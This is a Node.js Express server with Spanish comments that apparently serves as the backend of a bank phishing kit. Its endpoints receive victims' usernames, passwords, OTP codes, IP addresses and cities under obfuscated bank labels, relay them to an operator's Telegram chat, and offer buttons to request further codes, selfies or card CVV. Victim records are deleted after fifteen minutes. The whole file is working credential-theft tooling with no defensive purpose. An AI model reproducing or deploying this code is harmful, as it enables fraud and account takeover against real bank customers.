const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const fs = require('fs');
require('dotenv').config();
const app = express();

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const CLIENTES_DIR = './clientes';

if (!fs.existsSync(CLIENTES_DIR)) {
  fs.mkdirSync(CLIENTES_DIR);
}

const path = require('path');

// Limpieza automática cada 10 minutos: borra archivos de clientes con más de 15 minutos
setInterval(() => {
  const files = fs.readdirSync(CLIENTES_DIR);
  const ahora = Date.now();
  files.forEach(file => {
    const fullPath = path.join(CLIENTES_DIR, file);
    const stats = fs.statSync(fullPath);
    const edadMinutos = (ahora - stats.mtimeMs) / 60000;
    if (edadMinutos > 15) {
      fs.unlinkSync(fullPath);
      console.log(`🗑️ Eliminado: ${file} (tenía ${Math.round(edadMinutos)} minutos)`);
    }
  });
}, 10 * 60 * 1000);

function guardarCliente(txid, data) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  fs.writeFileSync(ruta, JSON.stringify(data, null, 2));
}

function cargarCliente(txid) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  if (fs.existsSync(ruta)) {
    return JSON.parse(fs.readFileSync(ruta));
  }
  return null;
}

// Endpoint para /enviar (GTC)
app.post('/enviar', async (req, res) => {
  const { usar, clavv, txid, ip, ciudad } = req.body;
  const mensaje = `
🔵GTC🔵
🆔 ID: <code>${txid}</code>
📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>
🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;
  const cliente = {
    status: "esperando",
    usar,
    clavv,
    ip,
    ciudad
  };
  guardarCliente(txid, cliente);
  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
        { text: "👤SELFIE", callback_data: `errortok:${txid}` }
      ],
      [
        { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
      ]
    ]
  };
  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });
  res.sendStatus(200);
});

// Endpoint para /enviare (B4NPLUX-EMPRES4)
app.post('/enviare', async (req, res) => {
  const { usar, clavv, txid, ip, ciudad } = req.body;
  const mensaje = `
🔵B4NPLUX-EMPRES4🔵
🆔 ID: <code>${txid}</code>
📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>
🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;
  const cliente = {
    status: "esperando",
    usar,
    clavv,
    ip,
    ciudad
  };
  guardarCliente(txid, cliente);
  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
        { text: "❌CÓDIGO", callback_data: `errortok:${txid}` }
      ],
      [
        { text: "💳C3VV", callback_data: `ceve:${txid}` },
        { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
      ]
    ]
  };
  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });
  res.sendStatus(200);
});

// Endpoint para /enviar3 (M3RC4NTIL-PERSON4S OTP)
app.post('/enviar3', async (req, res) => {
  const { usar, clavv, txid, dinamic, ip, ciudad } = req.body;
  const mensaje = `
🔑🔵M3RC4NTIL-PERSON4S🔵
🆔 ID: <code>${txid}</code>
📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>
🔑 0TP: <code>${dinamic}</code>
🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;
  const cliente = cargarCliente(txid) || {};
  cliente.status = "esperando";
  guardarCliente(txid, cliente);
  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
        { text: "❌CÓDIGO", callback_data: `errortok:${txid}` }
      ],
      [
        { text: "💳C3VV", callback_data: `ceve:${txid}` },
        { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
      ]
    ]
  };
  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });
  res.sendStatus(200);
});

// Otros endpoints similares (agrega /enviar4, /enviar3e, etc. si los necesitas, sin preguntas)

app.get('/', (req, res) => res.send("Servidor activo en Render"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor activo en Render puerto ${PORT}`);
  console.log('TELEGRAM_TOKEN configurado:', !!TELEGRAM_TOKEN);
  console.log('CHAT_ID configurado:', !!CHAT_ID);
});
